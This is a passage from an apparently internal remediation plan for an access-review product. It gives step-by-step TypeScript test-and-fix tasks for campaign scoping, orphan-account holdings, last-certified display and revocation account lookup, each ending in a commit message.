**G8.** `riskFlags` is in the type, the schema and the public contract, is persisted on `Campaign.scope`, and is read by nothing. A campaign scoped to risky holdings silently generates items over **every** holding of those kinds — and `previewCampaignScope` calls the same unfiltered function, so the preview agrees with the wrong reality and the screen that exists to catch this confirms it.

**Resolution chosen (per the standing decision — build capability, strip dead code):** **remove it.** Confirmed by grep: `CampaignScope.riskFlags` has no reader anywhere in the tree, no test references it, and the console never sends it — the console cannot create a campaign at all (W6). Every other `riskFlags` hit is `CampaignItem.riskFlags`, which is a different, live column written by `startCampaign` and read by `isBulkCertifiable`, `MyReviewsPage` and the portal; that one stays untouched. Implementing the filter instead would mean designing a semantics nobody has asked for — the flags are computed *at generation*, from a snapshot the scope has not read yet, so "scope to risky holdings" would have to mean something different from what the item flags mean.

**G9.** `holdingsInScope` does not filter on state, unlike every revocation path, and `CampaignItem` carries no state column — so an absent fact is indistinguishable from a real holding on the reviewer's screen, and a reviewer certifies as held something nobody has read.

**Resolution chosen for G9:** exclude `unknown` from generation. §8 rule 3 forbids collapsing `unknown` into `not_held`, and putting it on a review screen with no state column does exactly that in the direction that ends in a signature. The region is already a `CoverageGap`, already counted on the campaign's own header, and already what makes a report answer `unknown` — so nothing is lost by not asking somebody to attest to it.

**Files:**
- Modify: `packages/core/src/govern/campaign-service.ts:19-45` (`CampaignScope`, `leafScopeSchema`) and `:145-152` (the holdings read)
- Modify: `packages/contracts/src/govern.ts:158` (`campaignScopeInput`)
- Test: `packages/core/src/govern/campaign-service.test.ts`

**Interfaces:**
- Consumes: `withTenant`, `type TenantClient` from `@syntra/db`; `readableSnapshot`, `type ReadableSnapshot`.
- Produces:
  - `CampaignScope` **loses** `riskFlags`. `campaignScopeSchema` loses it too, and the three `MutuallyAssignable` guards in the file — including `_scopeKeysMatch`, which is exact over `keyof` in both directions — fail to compile if only one side is edited. That is the mechanism that makes this a safe removal.
  - `campaignScopeInput` in `@syntra/contracts` loses `riskFlags`. It is not `.strict()`, so an old caller sending it gets it stripped rather than a 400 — which is the same behaviour it had when the field existed and was ignored.
  - `holdingsInScope` — unchanged signature; the query gains `state: 'held'`.

- [ ] **Step 1: Confirm nothing consumes it before removing it**

```bash
grep -rn "riskFlags" --include=*.ts --include=*.tsx packages apps | grep -v /dist/ | grep -v "\.test\."
```

Expected: every remaining hit is `CampaignItem.riskFlags` — `campaign-service.ts:502` (the write), `decision-service.ts` (`isBulkCertifiable`, the facts, the audit payloads), `MyReviewsPage.tsx` (the console reading the item's flags). The only scope hits are `campaign-service.ts:30`, `campaign-service.ts:43` and `contracts/src/govern.ts:158`, which are the three lines this task deletes. **If the console turns out to send `scope.riskFlags` anywhere, remove it there too** — it does not today, because the console has no campaign-creation screen at all.

```bash
grep -rn "riskFlags" --include=*.test.ts --include=*.test.tsx packages apps | grep -v /dist/
```

Expected: every hit is over `CampaignItem.riskFlags`. No test constructs a scope with the field.

- [ ] **Step 2: Write the failing test**

Add to `packages/core/src/govern/campaign-service.test.ts`:

```ts
/**
 * §8 rule 3: "no aggregation path exists that collapses `unknown` into
 * `not_held`" -- and a campaign item is the aggregation path that ends in a
 * signature.
 *
 * `holdingsInScope` did not filter on state, unlike every revocation path, and
 * `CampaignItem` carries no state column. So a holding nobody could read
 * appeared on the reviewer's screen indistinguishable from one somebody had,
 * and was certified as held. Nothing is lost by leaving it out: the region is
 * already a CoverageGap, already counted on the campaign's own header, and
 * already what makes a report answer `unknown`.
 */
describe('a holding whose state is unknown', () => {
  it('generates no campaign item', async () => {
    const built = await buildSnapshot(tenantId, { now: NOW });
    await withTenant(tenantId, (tx) =>
      tx.holding.updateMany({
        where: { snapshotId: built.snapshotId },
        data: { state: 'unknown' },
      }),
    );

    const { id } = await createCampaign(
      tenantId,
      actorUserId,
      draft({ snapshotId: built.snapshotId }),
    );
    // An empty scope is refused rather than started: "starting it would email
    // reviewers about an empty queue".
    await expect(
      startCampaign(tenantId, actorUserId, id, { now: NOW }),
    ).rejects.toMatchObject({ code: 'empty_scope' });
  });

  it('is not counted in the scope preview either', async () => {
    // The preview and the generation call the SAME function, which is the only
    // reason the screen can be trusted. That property is what made the
    // riskFlags gap invisible: the preview agreed with the wrong reality.
    const built = await buildSnapshot(tenantId, { now: NOW });
    const before = await previewCampaignScope(
      tenantId,
      { resourceKinds: ['targetEntitlement'] },
      built.snapshotId,
    );
    expect(before.holdings).toBeGreaterThan(0);

    await withTenant(tenantId, (tx) =>
      tx.holding.updateMany({
        where: { snapshotId: built.snapshotId },
        data: { state: 'unknown' },
      }),
    );
    const after = await previewCampaignScope(
      tenantId,
      { resourceKinds: ['targetEntitlement'] },
      built.snapshotId,
    );
    expect(after.holdings).toBe(0);
  });
});

/**
 * The field was in the type, the schema and the public contract, was persisted
 * on `Campaign.scope`, and was read by NOTHING -- so a campaign scoped to risky
 * holdings silently covered every holding of those kinds, and the preview
 * agreed with it because they share a function.
 *
 * Removed rather than implemented. The flags are computed AT GENERATION from a
 * snapshot the scope has not read yet, so "scope to risky holdings" would have
 * had to mean something different from what the item flags mean -- and nobody
 * has asked for either meaning.
 */
it('no longer accepts a riskFlags scope at all', () => {
  const parsed = campaignScopeSchema.parse({
    resourceKinds: ['targetEntitlement'],
    riskFlags: ['privileged'],
  });
  expect(parsed).not.toHaveProperty('riskFlags');
});
```

- [ ] **Step 3: Run it to verify it fails**

Run: `npx vitest run packages/core/src/govern/campaign-service.test.ts -t 'unknown'`

Expected: FAIL — the campaign starts over unknown holdings, the preview counts them, and the parsed scope still carries `riskFlags`.

- [ ] **Step 4: Delete the field from the type and the schema**

In `packages/core/src/govern/campaign-service.ts`, remove `riskFlags?: string[] | undefined;` from `CampaignScope` (line 30) and `riskFlags: z.array(z.string().min(1)).min(1).optional(),` from `leafScopeSchema` (line 43), and add above the interface:

```ts
/**
 * NO `riskFlags`. It was here, in the schema, and in the public contract; it
 * was persisted on `Campaign.scope`; and it was read by nothing. A campaign
 * scoped to risky holdings silently generated items over EVERY holding of those
 * kinds -- and `previewCampaignScope` calls the same unfiltered function, so
 * the screen that exists to catch exactly this confirmed the wrong answer.
 *
 * Removed rather than implemented, deliberately. The flags on a
 * `CampaignItem` -- privileged, unattributable, stale, needs_review,
 * sod_violation, no_human_decision -- are computed AT GENERATION, from the
 * snapshot and from `AccessGrant` and `SodViolation` rows the scope has not
 * looked at. So a scope filter over them would have to mean something
 * different from what the item flags mean, and nobody has asked for either.
 *
 * `CampaignItem.riskFlags` is untouched and is a different thing: a live
 * column, written by `startCampaign`, read by `isBulkCertifiable` and by the
 * reviewer's screen.
 */
```

- [ ] **Step 5: Delete it from the contract**

In `packages/contracts/src/govern.ts`, remove `riskFlags: z.array(z.string().min(1)).min(1).optional(),` from `campaignScopeInput` and leave in its place:

```ts
  // No `riskFlags`. It was accepted here, stored on `Campaign.scope`, and read
  // by nothing -- so a campaign scoped to risky holdings covered everything.
  // See `CampaignScope` in packages/core/src/govern/campaign-service.ts for why
  // it is removed rather than implemented. This schema is not `.strict()`, so a
  // caller still sending it has the field stripped, which is exactly what
  // happened to it before.
```

- [ ] **Step 6: Filter the holdings read on state**

In `packages/core/src/govern/campaign-service.ts`, in `holdingsInScope`:

```ts
  const holdingRows = await tx.holding.findMany({
    where: {
      snapshotId: snapshot.id,
      // `held`, and only `held`. §8 rule 3: "no aggregation path exists that
      // collapses `unknown` into `not_held`" -- and a campaign item is the
      // aggregation path that ends in a signature. `CampaignItem` carries no
      // state column, so an unknown holding reached the reviewer's screen
      // indistinguishable from a real one and was certified as held.
      //
      // Nothing is lost by leaving it out. The region is already a
      // `CoverageGap`, it is already counted on the campaign's own header, and
      // it is already what makes a report over that scope answer `unknown`
      // rather than a number. Every revocation path in this module filters the
      // same way; this was the one that did not.
      state: 'held',
      resourceKind: { in: scope.resourceKinds },
      ...(scope.systemIds === undefined ? {} : { systemId: { in: scope.systemIds } }),
      ...(scope.privilegedOnly === true ? { privileged: true } : {}),
    },
    include: { attributions: { select: { kind: true, refId: true, detail: true } } },
  });
```

- [ ] **Step 7: Run the tests to verify they pass**

Run: `npx vitest run packages/core/src/govern/campaign-service.test.ts`

Expected: PASS. The three `MutuallyAssignable` guards in `campaign-service.ts` are what prove the type and the schema were edited together — if only one side was changed, `tsc` fails rather than a test.

- [ ] **Step 8: Run the contract and route suites**

```bash
npx vitest run packages/contracts
npx vitest run apps/api/src/routes/admin/govern.test.ts
```

Expected: PASS.

- [ ] **Step 9: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0 — and this is the gate that matters here, because `_scopeKeysMatch` is exact over `keyof` in both directions.

```bash
git add packages/core/src/govern/campaign-service.ts \
        packages/core/src/govern/campaign-service.test.ts \
        packages/contracts/src/govern.ts
git commit -m "$(cat <<'MSG'
fix(govern): a campaign scope that means what it says

CampaignScope.riskFlags was in the type, the schema and the public
contract, was persisted on Campaign.scope, and was read by nothing -- so a
campaign scoped to risky holdings silently generated items over every
holding of those kinds, and previewCampaignScope calls the same unfiltered
function, so the screen that exists to catch exactly this confirmed the
wrong answer.

Removed rather than implemented. The item flags are computed AT
GENERATION, from the snapshot and from AccessGrant and SodViolation rows
the scope has not looked at, so a scope filter over them would have to
mean something different from what the item flags mean -- and nobody has
asked for either. Confirmed by grep that nothing reads it and the console
never sends it. CampaignItem.riskFlags is untouched: a live column,
written by startCampaign and read by isBulkCertifiable and the reviewer's
screen.

And items were generated over `state: 'unknown'` holdings. Section 8 rule
3 says no aggregation path collapses unknown into not_held, and a campaign
item is the aggregation path that ends in a signature -- CampaignItem has
no state column, so a holding nobody could read reached the reviewer
indistinguishable from a real one and was certified as held. Every
revocation path filters on state; this was the one that did not. Nothing
is lost: the region is already a CoverageGap, already counted on the
campaign's header, and already what makes a report answer unknown.
MSG
)"
```

---

### Task 15: The three that name the wrong thing

Spec §6.1 — **G10** ("Last certified" is always blank), **G14** (orphan-account holdings are dropped), **G16** (`revocation_order` resolves the target account by `findFirstOrThrow`). Three independent one-file fixes, grouped because none is large enough to review on its own and none shares code with the others.

**G10.** `projectCertification` writes `subjectRefId` as the **bare** person id or account ref. The portal queries `subjectRefId: { in: rows.map((r) => r.subjectKey) }` and keys its map on `subjectKey` — `person:<uuid>`. Every item therefore reads as never certified, pushing reviewers to re-attest blind, which is the exact behaviour §12's "last certified, and by whom" line exists to prevent. `report-service.ts` and `snapshot-service.ts` both build the key from the bare ref, so the writer is right and the reader is the wrong side.

**G14.** `collect` skips any user whose `personId` is null for groups, applications and roles. §6: an orphan account's holdings **are** holdings, held by somebody Syntra cannot name. A service account holding `tenant.manage` produces a `subject_unresolvable` gap and no `syntraRole` holding — so it appears in no report, no campaign and no SoD evaluation, which is the opposite of what an access review is for.

**G16.** `createRevocationOrder`'s account lookup is `findFirstOrThrow({ where: { targetSystemId, ...(personId ?? {}) } })`. For an item with a person it is safe only because of `@@unique([tenantId, targetSystemId, personId])` — a uniqueness nothing at this call site states. For an item whose subject is an **account**, `personId` is null, the spread contributes nothing, and the query picks an arbitrary account in that target: **somebody else's**. The item already carries `accountRef`.

**Files:**
- Modify: `apps/api/src/routes/govern-portal.ts:125-156`
- Modify: `packages/core/src/govern/collect.ts:331`, `:377`, `:442`
- Modify: `packages/core/src/govern/revocation-service.ts:628-635`
- Test: `apps/api/src/routes/govern-portal.test.ts`, `packages/core/src/govern/collect.test.ts`, `packages/core/src/govern/revocation-service.test.ts`

**Interfaces:**
- Consumes: `parseSubjectKey(key: string) => SubjectRef | null` and `SYNTRA_SYSTEM_ID` from `packages/core/src/govern/types.js`; `CollectedHolding` from `./collect.js`.
- Produces: no signature changes anywhere. Three behaviour changes: the portal's certification map keys on the bare ref; `collect` emits `{ kind: 'account', systemId: SYNTRA_SYSTEM_ID, accountRef: user.id }` holdings for unlinked users; `createRevocationOrder`'s caller resolves the account by `accountRef` when the item has no person.

- [ ] **Step 1: Write the failing test for "last certified"**

Add to `apps/api/src/routes/govern-portal.test.ts`:

```ts
it('shows when an item’s holding was last certified, and by whom', async () => {
  // §12 puts this on the reviewer's screen so they are not re-attesting blind,
  // and it was ALWAYS BLANK. `projectCertification` writes `subjectRefId` as
  // the bare person id; the portal queried it with `subjectKey` -- `person:
  // <uuid>` -- and keyed its map the same way, so nothing ever matched.
  // report-service and snapshot-service both build the key from the bare ref,
  // so the writer was right and the reader was the wrong side.
  const seeded = await seedReviewableItem();
  await withTenant(ctx.tenantId, (tx) =>
    tx.holdingCertification.create({
      data: {
        tenantId: ctx.tenantId,
        subjectRefType: 'person',
        subjectRefId: seeded.personId,
        systemId: seeded.systemId,
        resourceKind: seeded.resourceKind,
        resourceId: seeded.resourceId,
        lastCertifiedAt: new Date('2026-01-15T09:00:00Z'),
        lastCertifiedByPersonId: seeded.certifierPersonId,
      },
    }),
  );

  const res = await get('/api/govern/reviews', seeded.cookie);
  expect(res.statusCode).toBe(200);
  const item = (res.json() as { items: { lastCertifiedAt: string | null; lastCertifiedBy: string | null }[] })
    .items[0]!;
  expect(item.lastCertifiedAt).toBe('2026-01-15T09:00:00.000Z');
  expect(item.lastCertifiedBy).toBeTruthy();
});
```

Reuse the file's existing `mkItem` fixture rather than writing a second one; `seedReviewableItem` above is whatever wrapper the file already has around it.

- [ ] **Step 2: Run it to verify it fails**

Run: `npx vitest run apps/api/src/routes/govern-portal.test.ts -t 'last certified'`

Expected: FAIL — both fields are `null`.

- [ ] **Step 3: Key the portal on the ref the writer writes**

In `apps/api/src/routes/govern-portal.ts`, replace the certification read inside the `Promise.all` and the map that consumes it:

```ts
        // THE BARE REF, which is what `projectCertification` writes.
        //
        // This queried `subjectRefId: { in: rows.map(r => r.subjectKey) }` --
        // `person:<uuid>` -- and keyed its map the same way, so no row ever
        // matched and every item on every reviewer's screen read "never
        // certified". §12 puts this line on the screen precisely so a reviewer
        // is not re-attesting blind, and it was blank for everybody.
        // report-service.ts and snapshot-service.ts both build the key from the
        // bare ref: the writer was right and this was the wrong side.
        tx.holdingCertification.findMany({
          where: {
            subjectRefId: {
              in: [
                ...new Set(
                  rows.map((r) => {
                    const subject = parseSubjectKey(r.subjectKey);
                    return subject === null
                      ? r.subjectKey
                      : subject.kind === 'person'
                        ? subject.personId
                        : subject.accountRef;
                  }),
                ),
              ],
            },
          },
        }),
```

and:

```ts
      const certByKey = new Map(
        certifications.map((c) => [
          `${c.subjectRefId}|${c.systemId}|${c.resourceKind}|${c.resourceId}`,
          c,
        ]),
      );
      /** The bare ref for a row, matching what `projectCertification` writes. */
      const refOf = (subjectKey: string, accountRef: string | null): string => {
        const subject = parseSubjectKey(subjectKey);
        if (subject === null) return subjectKey;
        return subject.kind === 'person' ? subject.personId : subject.accountRef;
      };
```

and at the call site inside `rows.map`:

```ts
          const cert = certByKey.get(
            `${refOf(row.subjectKey, row.accountRef)}|${row.systemId}|${row.resourceKind}|${row.resourceId}`,
          );
```

Add `parseSubjectKey` to the file's `@syntra/core` import if it is not already there — it is, at line 6 of the import list.

- [ ] **Step 4: Write the failing test for orphan holdings**

Add to `packages/core/src/govern/collect.test.ts`:

```ts
/**
 * §6: an orphan account's holdings ARE holdings, held by somebody Syntra
 * cannot name.
 *
 * `collect` skipped any user with no `personId` for groups, applications and
 * roles, so a service account holding `tenant.manage` produced a
 * `subject_unresolvable` gap and NO `syntraRole` holding -- it appeared in no
 * report, no campaign and no SoD evaluation. An account that can sign in to the
 * identity platform, belongs to nobody, and holds the permission to
 * administer tenants is the single most interesting row an access review can
 * put in front of somebody, and it was the one row that was never there.
 */
describe('an account with no person behind it', () => {
  it('still contributes its group, application and role holdings', async () => {
    const seeded = await seedUnlinkedUserHoldingEverything();

    const collected = await collectTenant(tenantId, { asOf: NOW });
    const mine = collected.holdings.filter(
      (h) => h.subject.kind === 'account' && h.subject.accountRef === seeded.userId,
    );

    expect(mine.map((h) => h.resourceKind).sort()).toEqual([
      'application',
      'syntraGroup',
      'syntraRole',
    ]);
    // The subject is the ACCOUNT, named by what it is. `subjectKey` is
    // `account:syntra:<userId>`, which is what every report and every campaign
    // groups on.
    expect(mine.every((h) => h.subject.kind === 'account')).toBe(true);
  });

  it('still records the gap, because the account is ALSO unresolvable', async () => {
    // The holding and the gap are two different facts and both are true. The
    // gap says "Govern cannot name who holds this"; the holdings say what they
    // hold. Dropping either is a different kind of dishonesty.
    const seeded = await seedUnlinkedUserHoldingEverything();
    const collected = await collectTenant(tenantId, { asOf: NOW });
    expect(
      collected.gaps.some(
        (g) => g.kind === 'subject_unresolvable' && g.accountRef === seeded.userId,
      ),
    ).toBe(true);
  });
});
```

`seedUnlinkedUserHoldingEverything()` creates a `User` with `personId: null`, one `GroupMembership`, one `AppAssignment` reachable through `resolveApplicationPaths`, and one `RoleAssignment`. Reuse the file's existing seeding helpers for each.

- [ ] **Step 5: Run it to verify it fails**

Run: `npx vitest run packages/core/src/govern/collect.test.ts -t 'no person behind it'`

Expected: FAIL — `mine` is empty.

- [ ] **Step 6: Emit the account subject at all three sites**

In `packages/core/src/govern/collect.ts`, add above the memberships loop:

```ts
/**
 * The subject for a `User` row, whether or not Govern can name the person
 * behind it.
 *
 * All three of the loops below used to be `if (user?.personId == null) continue;`
 * -- so an account with no person contributed NO holdings at all, only a
 * `subject_unresolvable` gap. §6 is explicit that an orphan account's holdings
 * are holdings, held by somebody Syntra cannot name, and the consequence of
 * dropping them is that a service account holding `tenant.manage` appeared in
 * no report, no campaign and no SoD evaluation. That is the single most
 * interesting row an access review can produce, and it was the one row that was
 * never there.
 *
 * `SYNTRA_SYSTEM_ID` rather than the resource's own system: the SUBJECT is a
 * Syntra account, whatever system the thing it holds lives in.
 */
function subjectFor(user: { id: string; personId: string | null }): SubjectRef {
  return user.personId === null
    ? { kind: 'account', systemId: SYNTRA_SYSTEM_ID, accountRef: user.id }
    : { kind: 'person', personId: user.personId };
}
```

with `type SubjectRef` added to the file's import from `./types.js`.

Then at each of the three sites, replace the skip with a presence check and use the helper:

```ts
    const user = userById.get(m.userId);
    // The USER must exist; the PERSON need not. A membership whose user row is
    // missing is a referential impossibility under the foreign key, and
    // guessing at it would invent a subject.
    if (user === undefined) continue;
```

and change each `subject: { kind: 'person', personId: user.personId },` to `subject: subjectFor(user),`. The three sites are the group-membership loop (line 331), the application-path loop (line 377) and the role-assignment loop (line 442). The `syntraUser` loop at line 279 keeps its skip: that holding is *about* the account, and an account holding itself is not a holding — the `subject_unresolvable` gap immediately below it is the row that says so.

Inside the application loop, `user.personId` is also read for nothing else; inside the role loop it is not read at all. Check each site compiles without a non-null assertion — if one needs `user.personId!`, that site is doing something else with the person and must be read before it is changed.

- [ ] **Step 7: Write the failing test for the account lookup**

Add to `packages/core/src/govern/revocation-service.test.ts`:

```ts
/**
 * `findFirstOrThrow({ where: { targetSystemId, ...(personId ? { personId } : {}) } })`.
 *
 * For an item WITH a person it is safe only because of
 * `@@unique([tenantId, targetSystemId, personId])` -- a uniqueness nothing at
 * that call site states, and one a future second-account-per-person feature
 * would remove without anything here failing.
 *
 * For an item whose subject is an ACCOUNT, `personId` is null, the spread
 * contributes nothing, and the query takes the first account in that target.
 * Somebody else's. The order is not even defined. The item already carries
 * `accountRef`, which is the answer.
 */
it('resolves the revocation order’s account from the item’s own accountRef', async () => {
  const seeded = await seedTwoAccountsInOneTarget();

  // The item's subject is the SECOND account, which is not the first row the
  // old query would have found.
  const batch = await computeRevocationBatch(tenantId, actorUserId, seeded.campaignId, {
    now: NOW,
  });
  await confirmRevocationBatch(tenantId, actorUserId, batch.batchId, { now: NOW, confirmed: true });

  const order = await withTenant(tenantId, (tx) => tx.revocationOrder.findFirstOrThrow());
  expect(order.accountId).toBe(seeded.intendedAccountId);
  expect(order.accountId).not.toBe(seeded.otherAccountId);
});
```

`seedTwoAccountsInOneTarget()` builds one target with two `TargetAccount` rows, and a campaign item whose `personId` is null and whose `accountRef` is the second account's `anchor` — the value `collect` writes for a target account subject. Read `collect.ts`'s target-account section to confirm what `accountRef` holds before writing the fixture.

- [ ] **Step 8: Run it to verify it fails**

Run: `npx vitest run packages/core/src/govern/revocation-service.test.ts -t 'accountRef'`

Expected: FAIL — the order names the other account.

- [ ] **Step 9: Resolve the account by the ref the item carries**

In `packages/core/src/govern/revocation-service.ts`, replace the account lookup in the `revocation_order` branch:

```ts
          // THE ITEM'S OWN `accountRef` WHEN IT HAS ONE.
          //
          // This was `findFirstOrThrow({ where: { targetSystemId, ...(personId
          // ? { personId } : {}) } })`. With a person it was safe only because
          // of `@@unique([tenantId, targetSystemId, personId])` -- a uniqueness
          // nothing here states, and one that a second-account-per-person
          // feature would remove with nothing on this path failing. With NO
          // person -- an item whose subject is an unattributed account, which is
          // exactly the kind of holding a review exists to surface -- the spread
          // contributed nothing and the query took the first account in the
          // target, in no defined order. Somebody else's account, revoked under
          // a reviewer's name.
          const account =
            item.accountRef !== null
              ? await tx.targetAccount.findFirstOrThrow({
                  where: { targetSystemId: item.systemId, anchor: item.accountRef },
                  select: { id: true },
                })
              : item.personId !== null
                ? await tx.targetAccount.findFirstOrThrow({
                    where: { targetSystemId: item.systemId, personId: item.personId },
                    select: { id: true },
                  })
                : // Neither. There is nothing to resolve and nothing safe to
                  // guess, and a revocation order against an arbitrary account
                  // is worse than none.
                  (() => {
                    throw new Error(
                      `campaign item ${item.id} names neither a person nor an account, so no target account can be resolved for its revocation`,
                    );
                  })();
```

- [ ] **Step 10: Run all three suites**

```bash
npx vitest run apps/api/src/routes/govern-portal.test.ts
npx vitest run packages/core/src/govern/collect.test.ts packages/core/src/govern/snapshot-service.test.ts
npx vitest run packages/core/src/govern/revocation-service.test.ts
```

Expected: PASS. `snapshot-service.test.ts` is in the list because `collect` now emits more holdings and the snapshot's counts are asserted there.

- [ ] **Step 11: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add apps/api/src/routes/govern-portal.ts apps/api/src/routes/govern-portal.test.ts \
        packages/core/src/govern/collect.ts packages/core/src/govern/collect.test.ts \
        packages/core/src/govern/revocation-service.ts \
        packages/core/src/govern/revocation-service.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): three places that named the wrong thing

"Last certified" was always blank, for everybody, on every item.
projectCertification writes subjectRefId as the bare person id; the portal
queried it with subjectKey -- person:<uuid> -- and keyed its map the same
way, so nothing ever matched. Section 12 puts that line on the screen
precisely so a reviewer is not re-attesting blind, and report-service and
snapshot-service both key on the bare ref, so the writer was right and the
reader was the wrong side.

collect dropped every holding of an account with no person, for groups,
applications and roles. Section 6 says an orphan account's holdings ARE
holdings, held by somebody Syntra cannot name -- so a service account with
tenant.manage produced a subject_unresolvable gap and no syntraRole
holding, and appeared in no report, no campaign and no SoD evaluation. An
account that can sign in, belongs to nobody, and can administer tenants is
the most interesting row a review can produce, and it was the one row that
was never there. The gap is still recorded: the holding and the gap are
two different true facts.

And a revocation order resolved its target account with findFirstOrThrow
on { targetSystemId, personId? }. With a person it was safe only because
of a unique index nothing at the call site states. With no person -- an
item whose subject is an unattributed account, which is exactly what a
review exists to surface -- the spread contributed nothing and the query
took the first account in the target, in no defined order. Somebody else's
account, revoked under a reviewer's name. The item carries accountRef.
MSG
)"
```

---

## Done when

- [ ] Two reviewers decide one item concurrently and exactly one succeeds, with one `CampaignDecision` row and a `HoldingCertification` that agrees with the item's status.
- [ ] `bulkCertify` refuses a closed campaign and moots a departed subject's item, as the single path does.
- [ ] `pruneSnapshots` retains a snapshot a campaign, a re-based campaign, or a campaign item points at.
- [ ] A campaign closes with `revokedItems` counting only `revocation_applied`, and `revokeDecidedItems`, `dispatchedItems`, `failedItems` and `requiresChangeItems` each reported separately on the row, the audit event and the API.
- [ ] `Campaign.status = 'executing'` has no reader left; `startCampaign` refuses before `opensAt`; `extendCampaign` refuses a closed campaign.
- [ ] `closeDueCampaigns` computes a `previewed` revocation batch when a campaign has revoke decisions, computes none when it does not, and leaves the campaign `open` if the computation fails.
- [ ] `runCampaignReminders` stamps `lastRemindedAt` in a transaction that no longer contains escalation, and escalates in `ESCALATION_BATCH` pages that add no duplicate row on a second run.
- [ ] `rebaseCampaign` is paged, leaves `undecided`, `moot` and every `revocation_*` item untouched, drops the certification projection only for items it re-opens from `certified`, and refuses a campaign that is not `open`.
- [ ] The transaction-budget file covers reminders-with-escalation, the re-base, the exception sweep, the accepted-findings sweep and the decision graph, with a bounded case and an unbounded mutation for each of the first three.
- [ ] The gain cross-reference links every gain in a population larger than one batch; two overlapping SoD detection passes converge on one violation row.
- [ ] An SoD rule whose functions share a resource is `unevaluable`; an `unknown` holding on either side is `unevaluable`; laundering matches on the full resource key; 4,000 edges against 20 rules scan in under a second.
- [ ] A campaign evidence bundle contains its items, decisions, reviewers, dispatches and notifications; a report bundle says on its cover that it covers no campaign; `storageRef` names a route that rebuilds the bundle to the same digest.
- [ ] A CSV cell beginning `=`, `+`, `-`, `@`, tab or CR is neutralised; an ordinary value is untouched; a refused export writes an audit event with `outcome: 'failure'`.
- [ ] Clearing the snapshot cadence unschedules the snapshot purpose and nothing else.
- [ ] `POST /govern/integrity/verify` returns `signed_and_verified` on a second call and raises no finding; `POST /govern/integrity/verify-full` exists, is gated on `govern.manage`, and writes an `AuditChainCheck` with `mode: 'full'`.
- [ ] A refused risk acceptance files its remediation against the rule owner; `POST /govern/sod/exceptions/:id/revoke` exists and refuses the beneficiary; `shouldWarn` fires the day after a missed sweep.
- [ ] `CampaignScope.riskFlags` is gone from the type, the schema and the contract; no campaign item is generated over an `unknown` holding.
- [ ] The reviewer's screen shows when a holding was last certified; an unlinked account's group, application and role holdings are collected; a revocation order resolves its account from the item's `accountRef`.
- [ ] `npx tsc -b` exits 0, `pnpm --filter @syntra/web build` succeeds, and `packages/core/src/auth/password-reset.test.ts` is still uncommitted and untouched.

## Deliberately not in this plan

Everything else in the findings register. In order of the plans around this one:

- **Remediation 1 — Urgent.** C1 (the duplicate-holding snapshot failure that halts governance permanently), D1 (`pnpm db:reset` truncating the lab database), X1–X3 (the 71 web tests CI cannot see, the unbuilt production bundle, migration ordering), and the three tests that were committed red. **Task 3 of this plan adds a migration and depends on remediation-1's migration-name floor being understood** — name it above `20260830000000` whether or not that plan has landed.
- **Remediation 3 — Approvals and provisioning.** A1–A9, P1–P8: the stuck admin-unblocked multi-stage request, the terminal-transition races in Automate's `recordDecision`, the reviewer revocation order that is marked `planned` and never applied, and the double apply. **P1 is the far end of this plan's Task 4** — a batch that computes and dispatches correctly still meets an order nothing marks `applied`.
- **Remediation 4 — Auth, API and console.** H1–H6, N1–N6, W1–W9, S1–S7, B1–B5. Three of those are the other half of work here: **W6** (campaign creation, start, re-base and previews have no console surface at all, so this plan's Tasks 3, 6 and 14 improve routes nobody can reach from the product), **W2** (bulk certify silently drops other campaigns' selections, which is the console side of Task 1), and **N3** (the three govern preview endpoints ignore org-unit scoping).
- **Remediation 5 — The update feature.** U1–U10, plus the lab rehearsal its own design lists as outstanding.

